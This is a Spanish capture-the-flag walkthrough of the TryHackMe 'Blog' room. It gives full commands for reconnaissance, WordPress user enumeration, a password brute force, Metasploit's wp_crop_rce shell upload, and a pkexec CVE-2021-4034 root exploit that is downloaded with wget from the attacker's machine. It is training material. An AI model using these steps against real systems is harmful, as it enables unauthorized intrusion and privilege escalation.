@@ -1,0 +1,148 @@
+>>>TryHackMe
+>>Blog
+
+Primero que nada, la información de TryHackMe nos dice que tenemos que cambiar el /etc/hosts asociando la IP al siguiente host "blog.thm".
+
+>nmap
+
+>nmap -p- -sS -sV -sC  --min-rate 5000 -vvv -n -Pn 10.10.135.69 -oN nmap
+
+•22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+•80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+•139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+•445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+
+>fuzzing
+
+>gobuster dir -u http://blog.thm -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+
+•/rss
+•/login
+•/0
+•/feed
+•/atom
+•/wp-content
+•/admin
+•/welcome
+•/w
+•/n
+•/rss2
+•/wp-includes
+•/no
+•/page1
+•/'
+•/dashboard
+•/note
+•/%20
+•/we
+
+Al ver que es un WordPress, buscaremos usuarios mediante wp-scan.
+
+>wpscan --url 10.10.134.72 --enumerate u
+
+•bjoel
+•kwheel
+•Karen Wheeler
+•Billy Joel
+
+>También se buscaron plugins, pero no se encontraron. Un dato interesante es que la versión de WordPress es 5.0.
+
+Ya con algunos usuarios, ahora procederemos a hacer fuerza bruta. Para esta ocasión utilizaremos wp-scan en lugar de hydra, ya que esta ataca no directamente al login, sino que en xml-rpc.
+
+>wpscan --url http://10.10.134.72:80 -U kwheel -P /usr/share/wordlists/rockyou.txt
+
+Usuario: kwheel, Contraseña: cutiepie1
+
+***
+Usualmente, cuando vulneramos un WordPress con login y pass, procedemos a crear una reverse shell dentro de él 404 y así obtener comandos de forma remota, pero esta vez buscaremos otra alternativa. Me hace falta practicar con Metasploit, así que optaremos por ahí.
+***
+
+Procedemos a buscar algún exploit relacionado con la versión del WordPress, ya que está desactualizado.
+
+Procedemos a utilizar Metasploit para esto.
+
+>msfconsole
+
+Buscamos:
+>search wordpress 5.0
+
+Este se ajusta a lo que buscamos:
+• 0  exploit/multi/http/wp_crop_rce                           2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
+
+**Investigando un poco sobre el exploit, vemos que parece subir un código malicioso (posiblemente una reverse shell) haciéndolo pasar por una imagen.**
+
+Seleccionamos:
+>use 0
+
+Vemos que requiere:
+>show options
+
+Vemos que nos hace falta un usuario, una pass y toca cambiar el RHOST.
+
+>set USERNAME kwheel
+>set PASSWORD cutiepie1
+>set RHOSTS 10.10.134.72
+
+Parece estar todo correcto.
+
+>run
+
+Y ya estamos dentro. Pero ahora toca hacer que sea una shell funcional. Esto lo logramos escribiendo "shell" en la consola de meterpreter.
+ 
+>whoami
+•www-data
+
+Ok, ahora toca hacerla una consola más interactiva.
+
+>script /dev/null -c bash
+>export TERM=xterm
+
+Luego de buscar por un rato encontramos que pkexec es una versión vulnerable.
+
+>find / -perm -4000 2>/dev/null
+
+/usr/bin/pkexec --version
+pkexec version 0.105
+
+Utilizamos un exploit en Python para llegar a root en esa versión.
+
+Primero, vamos a la carpeta donde tenemos el exploit y abrimos un servidor python.
+
+>python3 -m http.server 8080
+
+Luego, vamos a la carpeta /tmp donde siempre tenemos permisos de escritura.
+
+>cd /tmp
+>wget 10.18.112.21:8080/CVE-2021-4034.py
+
+Luego ejecutamos.
+
+>python3 CVE-2021-4034.py
+
+Y ya somos root.
+
+>whoami
+root
+
+# find / -name "root.txt" 2>/dev/null
+find / -name "root.txt" 2>/dev/null
+/root/root.txt
+
+# cat /root/root.txt
+cat /root/root.txt
+****************
+
+# find / -name "user.txt" 2>/dev/null
+find / -name "user.txt" 2>/dev/null
+/home/bjoel/user.txt
+/media/usb/user.txt
+
+# cat /home/bjoel/user.txt
+cat /home/bjoel/user.txt
+You won't find what you're looking for here.
+
+TRY HARDER
+
+# cat /media/usb/user.txt
+cat /media/usb/user.txt
+*************
